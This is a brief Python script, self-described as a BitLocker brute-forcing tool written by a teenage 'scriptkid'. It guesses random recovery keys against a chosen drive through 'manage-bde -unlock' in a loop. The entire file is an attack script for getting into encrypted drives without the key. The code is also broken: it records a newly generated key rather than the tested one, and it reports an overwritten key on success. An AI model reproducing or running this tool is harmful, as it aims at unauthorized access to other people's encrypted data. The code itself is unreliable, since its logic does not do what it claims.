import os
import math
import subprocess
from sys import stdout
print('Welcome to BitLockerCrack.py - A shitty bitlocker bruteforcing tool made by a 15y/o scriptkid.\n')

driveLetter = input("Please input the drive letter to bruteforce.\nExample -> E\nMust only be the letter, a single character: ").upper() + ":"

def GenRecKey():
	global Rec_Key
	Rec_Key = ""
	for i in range(1,56):
		if i % 7 == 0:
			Rec_Key += "-"
		else:
			Rec_Key += str(math.floor((os.urandom(1)[0]/25.6)))
	return Rec_Key

driveLetter = driveLetter
if len(driveLetter) != 2:
	input("Drive letter should be one character, only one letter: D\nEnter to exit.")
	exit()

counter = 0
attemptedCodes = set()
print('Program has started. Please use the task manager\'s performance tab to check if the program is actually doing something.')
while len(attemptedCodes) != 10**12:
	gendKey = GenRecKey()
	if gendKey not in attemptedCodes:
		resultX = subprocess.run(['manage-bde', '-unlock', '-recoverypassword', gendKey, driveLetter],stdout=subprocess.PIPE)
		attemptedCodes.add(GenRecKey())
		counter += 1
		if counter % 100 == 0:
			stdout.write('\r' + str(counter))
			stdout.flush()
		if 'failed' in resultX.stdout.decode('utf-8'): continue
		elif 'successfully unlocked' in resultX.stdout.decode('utf-8'): input(f'Congatulations! The following code worked:/n{Rec_Key}')